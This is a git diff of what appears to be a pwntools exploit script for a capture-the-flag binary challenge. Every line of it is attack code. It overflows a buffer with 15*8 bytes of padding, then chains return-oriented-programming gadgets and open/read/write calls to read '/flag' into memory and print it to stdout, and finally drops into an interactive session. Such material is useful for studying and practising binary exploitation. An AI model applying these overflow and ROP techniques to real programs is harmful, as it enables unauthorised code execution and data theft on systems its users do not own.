@@ -38,7 +38,6 @@ rop_read_str = flat(
     pop_rdx_ret, 0x8,
     syscall_ret,
 
-    pop_rsi_ret = 
     main_fn
 )
 
@@ -49,6 +48,7 @@ rop_read_flag = flat(
     pop_rdi_ret, bss_addr,
     pop_rsi_ret, 0,
     # syscall_ret,
+    open_addr,
 
     # Read the file
     # read(fd, buf, 0x30);
@@ -57,6 +57,7 @@ rop_read_flag = flat(
     pop_rsi_ret, bss_addr,
     pop_rdx_ret, 0x30,
     # syscall_ret,
+    read_addr,
 
     # Write the file
     # write(1, buf, 0x30); // 1 --> stdout
@@ -66,11 +67,11 @@ rop_read_flag = flat(
     syscall_ret
 )
 raw_input()
-r.send(b'a'*15*8 + rop_read_str)
+r.send(b'a'*15*8 + rop_read_str + rop_read_flag)
 raw_input()
-r.send(b'/flag'.ljust(0x10, b'\x00'))
-raw_input()
-r.send(b'a'*15*8 + rop_read_flag)
+r.send(b'/flag'.ljust(0x8, b'\x00'))
+# raw_input()
+# r.send(b'a'*15*8 + rop_read_flag)
 
 
 r.interactive()
